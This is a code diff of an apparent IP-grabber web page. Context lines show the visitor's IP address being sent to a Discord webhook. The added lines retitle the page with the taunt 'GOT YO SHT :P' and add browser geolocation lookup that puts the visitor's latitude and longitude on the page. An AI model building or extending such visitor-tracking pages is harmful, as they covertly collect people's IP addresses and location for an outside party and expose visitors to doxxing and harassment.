@@ -61,9 +61,10 @@
                     <source src="sound.mp3" type="audio/mpeg">
                     Your browser does not support the audio element.
                 </audio>
-                <h1>Public and Private IP Addresses</h1>
+                <h1>GOT YO SHT :P</h1>
                 <p id="publicIP">Public IP: Loading...</p>
                 <p id="privateIP">Private IP: Loading...</p>
+                <p id="location">Location: Loading...</p>
             </div>
         </div>
     </div>
@@ -109,6 +110,45 @@
                 .catch(error => console.error('Error sending IP address to Discord webhook:', error));
         }
 
+        // Function to get the current location
+        function getLocation() {
+            // Check if geolocation is supported
+            if (navigator.geolocation) {
+                // Use geolocation to get the current position
+                navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
+            } else {
+                // Geolocation is not supported by this browser
+                document.getElementById('location').textContent = 'Geolocation is not supported by this browser.';
+            }
+        }
+
+        // Success callback function
+        function successCallback(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            document.getElementById('location').textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+        }
+
+        // Error callback function
+        function errorCallback(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById('location').textContent = 'User denied the request for Geolocation.';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById('location').textContent = 'Location information is unavailable.';
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById('location').textContent = 'The request to get user location timed out.';
+                    break;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById('location').textContent = 'An unknown error occurred.';
+                    break;
+            }
+        }
+
+        // Call the function to get the location
+        getLocation();
         // Call the functions to get the IP addresses
         getPublicIP();
         getPrivateIP();
